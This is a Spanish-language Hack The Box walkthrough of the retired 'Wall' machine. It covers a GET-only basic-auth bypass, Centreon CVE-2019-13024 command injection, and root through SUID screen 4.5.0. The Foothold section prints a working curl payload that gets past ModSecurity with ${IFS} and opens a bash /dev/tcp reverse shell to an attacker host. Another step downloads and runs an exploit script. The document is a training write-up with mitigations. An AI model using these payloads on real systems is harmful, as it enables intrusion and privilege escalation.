---
machine: Wall
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, centreon, cve-2019-13024, waf, modsecurity, pyc, screen, suid, privesc]
---

# Wall — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El sitio solo pide autenticación básica en las peticiones `GET`; un `POST` a `/monitoring` llega igualmente a `/centreon`, una instalación de Centreon 19.04 vulnerable a la CVE-2019-13024. El exploit público inyecta un comando en `init_script` y lo ejecuta al generar los archivos de configuración, pero un WAF de ModSecurity bloquea palabras clave, incluido el espacio. Se identifica el filtro y se usa `${IFS}` en lugar de espacios para completar la inyección y obtener shell como `www-data`. En el home de un usuario hay un `.pyc` que se decompila con `uncompyle6` y revela la contraseña de `shelby`. Con cualquiera de los dos usuarios, el binario SUID `screen-4.5.0` permite root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 7.6p1 Ubuntu 4ubuntu0.3.
- `80` Apache httpd 2.4.29 (Ubuntu).
- La web se sirve como `wall.htb`.

```bash
feroxbuster -u http://wall.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Aparecen `/monitoring` y `/centreon`; `/monitoring` redirige a la instalación de Centreon.

## Enumeración

`/monitoring` pide autenticación básica con `GET`. Sin embargo, la configuración de Apache aplica la restricción solo a ese método: un `POST` a la misma ruta pasa sin credenciales y llega a `/centreon`.

```bash
curl -i http://wall.htb/monitoring
curl -i -X POST http://wall.htb/monitoring/
```

La página de Centreon muestra la versión `19.04`, dentro del rango vulnerable a la CVE-2019-13024. La instalación no tiene credenciales por defecto.

## Foothold

El exploit público de Centreon envía un `init_script` con el comando y después llama a `generateFiles.php`, que pasa el valor a `shell_exec` sin sanear. La primera prueba falla porque ModSecurity bloquea la petición.

Se prueba el filtro con valores inocuos y se confirma que bloquea el espacio y varias palabras clave. El bypass consiste en sustituir los espacios por la variable `${IFS}`:

```bash
curl -s -X POST "http://wall.htb/centreon/main.get.php?p=60901" \
  --data-urlencode "name=myNagios" \
  --data-urlencode "init_script=bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/<LHOST>/<LPORT>${IFS}0>&1'"
curl -s "http://wall.htb/centreon/include/configuration/configGenerate/xml/generateFiles.php?lang=en_US"
```

La shell es de `www-data`.

## Movimiento lateral

En el sistema hay dos usuarios: `www-data` y `shelby`. En el home de `shelby` hay un archivo `.pyc` con permisos de lectura. Se copia y se decompila:

```bash
uncompyle6 shelby.pyc
```

El código contiene la contraseña en texto claro. Se usa con `su shelby` o por SSH.

## Escalada de privilegios

`LinEnum` o una búsqueda de SUID muestra un binario no estándar:

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/bin/screen-4.5.0` es SUID de root. La versión es vulnerable a CVE-2017-5618: `screen` escribe un archivo de log controlado por el usuario y permite escalar. Se usa el exploit público 41154, que compila una biblioteca y un binario y los carga en el contexto de root:

```bash
wget https://www.exploit-db.com/raw/41154 -O 41154.sh
bash 41154.sh
```

El script compila `libhax.so` y `rootshell`, aprovecha `screen` para escribir `/etc/ld.so.preload` y ejecuta el binario con privilegios, devolviendo una shell de root.

## Evidencia

- `/monitoring` con autenticación solo en `GET` y `POST` aceptado.
- Centreon 19.04 y CVE-2019-13024.
- Peticiones bloqueadas por ModSecurity y bypass con `${IFS}`.
- Shell como `www-data`.
- `.pyc` decompilado con la contraseña de `shelby`.
- SUID `screen-4.5.0` y shell de root.

## Lecciones aprendidas

- Una regla de autenticación por método HTTP deja huecos en los demás métodos.
- Un WAF no elimina la vulnerabilidad, solo cambia la codificación del payload.
- `${IFS}` permite construir comandos sin espacios.
- Un `.pyc` no protege secretos: se decompila.
- `screen` con SUID y versión antigua es una escalada conocida.

## Mitigaciones y detección

- Aplicar autenticación a todos los métodos y rutas, no solo a `GET`.
- Actualizar Centreon y parametrizar `init_script`; no pasarlo a `shell_exec`.
- Configurar ModSecurity en modo bloqueo y con reglas actualizadas, sin confiar solo en él.
- No dejar `.pyc`, backups ni código con credenciales en los homes.
- Retirar el bit SUID de binarios que no lo necesiten; actualizar `screen`.
- Alertar de peticiones con `${IFS}`, `$()` y de la creación de `/etc/ld.so.preload`.

## Referencias

- [0xdf — Wall](https://0xdf.gitlab.io/2019/12/07/htb-wall.html)
- [IppSec — Wall](https://www.youtube.com/watch?v=84xCsHvkxYE)
- [Hack The Box — Wall](https://app.hackthebox.com/machines/wall)
- [NVD — CVE-2019-13024](https://nvd.nist.gov/vuln/detail/CVE-2019-13024)
